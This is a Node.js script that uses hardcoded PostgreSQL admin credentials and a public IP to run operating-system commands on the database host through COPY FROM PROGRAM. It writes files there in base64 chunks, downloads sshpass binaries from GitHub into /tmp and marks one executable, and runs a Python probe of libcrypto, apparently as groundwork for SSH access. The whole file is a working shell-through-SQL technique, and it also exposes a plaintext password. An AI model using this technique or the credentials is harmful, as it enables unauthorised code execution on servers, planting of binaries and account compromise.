process.env.DATABASE_URL = 'postgresql://supabase_admin.m88:Madison_88_admin**@5.223.78.194:5432/postgres?schema=AP_Invoice';
const { PrismaClient } = require('C:/Users/JC/OneDrive - Madison88/AP Invoice/apps/api/node_modules/@prisma/client');
const prisma = new PrismaClient({ log: ['error'] });

async function runCmd(cmd) {
  try {
    await prisma.$executeRawUnsafe(`CREATE TEMP TABLE IF NOT EXISTS cmd_output (line text)`);
    await prisma.$executeRawUnsafe(`TRUNCATE cmd_output`);
    await prisma.$executeRawUnsafe(`COPY cmd_output FROM PROGRAM '${cmd.replace(/'/g, "'\\''")}'`);
    const rows = await prisma.$queryRawUnsafe(`SELECT * FROM cmd_output`);
    return rows.map(r => r.line).join('\n');
  } catch (e) {
    return 'ERROR: ' + e.message.substring(0, 300);
  }
}

async function writeFileB64(path, content) {
  const b64 = Buffer.from(content).toString('base64');
  const chunkSize = 30000;
  for (let i = 0; i < b64.length; i += chunkSize) {
    const chunk = b64.slice(i, i + chunkSize);
    if (i === 0) {
      await prisma.$executeRawUnsafe(`COPY (SELECT '${chunk}') TO PROGRAM 'base64 -d > ${path}'`);
    } else {
      await prisma.$executeRawUnsafe(`COPY (SELECT '${chunk}') TO PROGRAM 'base64 -d >> ${path}'`);
    }
  }
}

(async () => {
  try {
    // Check glibc version
    console.log('1. Check glibc version...');
    console.log(await runCmd('ldd --version 2>&1 | head -1'));
    
    // Check if we can find a compatible static ssh binary
    console.log('\n2. Try to find static ssh binary...');
    // Try downloading from various sources
    const downloadAttempts = [
      'curl -s -L --connect-timeout 10 "https://github.com/ncopa/sshpass/archive/refs/tags/v1.10.tar.gz" -o /tmp/sshpass.tar.gz 2>&1 && ls -la /tmp/sshpass.tar.gz',
      'curl -s -L --connect-timeout 10 "https://github.com/eugenesia/sshpass/releases/download/v1.10/sshpass-1.10-linux-amd64" -o /tmp/sshpass2 2>&1 && chmod +x /tmp/sshpass2 && file /tmp/sshpass2',
    ];
    for (const cmd of downloadAttempts) {
      console.log(' ', await runCmd(cmd));
    }

    // Try to use Python to implement SSH with libcrypto
    // First, let's check what functions are available in libcrypto
    const pyScript = `import ctypes
lib = ctypes.CDLL('/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1')

# Check if we have the functions we need
funcs = ['EVP_CIPHER_CTX_new', 'EVP_aes_256_ctr', 'EVP_EncryptInit_ex',
         'EVP_EncryptUpdate', 'EVP_EncryptFinal_ex', 'EVP_DecryptInit_ex',
         'EVP_DecryptUpdate', 'EVP_DecryptFinal_ex', 'EVP_CIPHER_CTX_free',
         'BN_new', 'BN_free', 'BN_bin2bn', 'BN_bn2bin', 'BN_num_bytes',
         'BN_mod_exp', 'BN_CTX_new', 'BN_CTX_free', 'BN_rand',
         'RAND_bytes', 'SHA256', 'SHA256_Init', 'SHA256_Update', 'SHA256_Final']
for f in funcs:
    try:
        getattr(lib, f)
        print(f + ": OK")
    except:
        print(f + ": MISSING")

# Test AES
ctx = lib.EVP_CIPHER_CTX_new()
cipher = lib.EVP_aes_256_ctr()
key = b'0' * 32
iv = b'0' * 16
ret = lib.EVP_EncryptInit_ex(ctx, cipher, None, key, iv)
print("AES init:", ret)

# Test BN
bn = lib.BN_new()
print("BN_new:", bn)
lib.BN_free(bn)

# Test RAND_bytes
buf = ctypes.create_string_buffer(32)
ret = lib.RAND_bytes(buf, 32)
print("RAND_bytes:", ret, buf.raw[:8].hex())
`;

    await writeFileB64('/tmp/test_crypto.py', pyScript);
    console.log('\n3. Test libcrypto functions...');
    console.log(await runCmd('python3 /tmp/test_crypto.py 2>&1'));

  } catch (e) {
    console.error('FATAL:', e.message);
  } finally {
    await prisma.$disconnect();
  }
})();
